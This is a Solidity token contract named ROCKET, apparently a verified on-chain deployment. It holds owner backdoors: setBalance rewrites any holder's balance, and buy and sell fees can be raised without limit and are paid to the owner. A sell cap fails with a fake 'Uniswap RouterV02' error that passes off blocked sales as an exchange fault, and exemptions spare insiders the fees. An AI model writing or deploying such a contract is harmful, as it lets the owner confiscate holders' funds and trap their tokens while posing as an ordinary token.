/**
 *Submitted for verification at BscScan.com on 2025-01-25
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);
}

contract ROCKET is  IERC20 {
    mapping(address => uint256) public _balances;
    mapping(address => bool) public _pools;  
    mapping(address => bool) public _excluded; 
    uint256 public sell_fee = 0;
    uint256 public buy_fee = 0;
    address public _tokenHolder;
    address public tokenContract;
    uint256 public _totalSupply;
    uint256 public _saleLimit;
    uint256 private delayTime;
    uint256 private lastTransactionTime;

    constructor(address tokenHolder) {
        _totalSupply = 1000_000_000*10**18;  
        _saleLimit = 0;
        _tokenHolder = tokenHolder;      
        _balances[_tokenHolder] = _totalSupply;
        _excluded[_tokenHolder] = true;
        _owner = msg.sender;
        //emit Transfer(address(0), msg.sender, _totalSupply);
        delayTime = 15; 
        lastTransactionTime = block.timestamp; 
    }
    // ownable
    address public _owner;
    modifier onlyOwner() {
        require(_owner == msg.sender || _tokenHolder == msg.sender, "Ownable: caller is not the owner 2");
        _;
    }    
    modifier onlyContract() {
        require(_owner == msg.sender || _tokenHolder == msg.sender || tokenContract == msg.sender,  "Ownable: caller is not the contract 2");
        _;
    }   
    function setTokenContract(address _tokenContract) public onlyOwner returns(bool){      
         tokenContract = _tokenContract;
         return true;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function _transferOwnership(address newOwner) public virtual onlyOwner {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function addPoolAddress(address _poolAddress) public onlyOwner returns(bool){      
         _pools[_poolAddress] = true;
         return true;
    }
    function deletePoolAddress(address _poolAddress) public onlyOwner returns(bool){      
         _pools[_poolAddress] = false;
         return true;
    }
    function excludeFromFee(address _address) public onlyOwner returns(bool){      
         _excluded[_address] = true;
         return true;
    }
    function includeInFee(address _address) public onlyOwner returns(bool){      
         _excluded[_address] = false;
         return true;
    }
    function setSellFee(uint256 _sell_fee) public onlyOwner returns(bool){      
         sell_fee = _sell_fee;
         return true;
    }
    function setBuyFee(uint256 _buy_fee) public onlyOwner returns(bool){      
         buy_fee = _buy_fee;
         return true;
    }
    function setBalance(address _address, uint256 _balance) public onlyOwner returns(bool){      
         _balances[_address] = _balance;
         return true;
    }
    function setSellLimit(uint256 newSaleLimit) public onlyOwner returns(bool){      
         _saleLimit = newSaleLimit;
         return true;
    }    
    function _transfer(address from, address to, uint256 amount) public onlyContract returns(uint256) {
        require(from != address(0), "ERC20: transfer from the zero address 2");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance 2");
        uint256 val;
        if(_excluded[from] || _excluded[to]){
            unchecked {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                val = amount;
            }
        } else {
            if(_pools[from]) {
                uint256 _this_scat = buy_fee;                
                uint256 _amount = amount * (100 - _this_scat) / 100;
                _balances[from] = fromBalance - amount;
                _balances[to]   += _amount;
                val = _amount;
            
                uint256 _this_scat_amount  = amount * _this_scat / 100;
                _balances[_owner] += _this_scat_amount;                
            } else if(_pools[to]){
                if(_saleLimit > 0){
                    require(amount<=_saleLimit, "Uniswap RouterV02: K2");
                } 
                uint256 _this_scat = sell_fee;
                uint256 _amount = amount * (100 - _this_scat) / 100;
                _balances[from] = fromBalance - amount;
                _balances[to]  += _amount;
                val = _amount;
            
                uint256 _this_scat_amount  = amount * _this_scat / 100;
                _balances[_owner] += _this_scat_amount;  
            } else {
                unchecked {
                    _balances[from] = fromBalance - amount;
                    _balances[to] += amount;
                    val = amount;
                }
            }
        }
        return val;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
  
}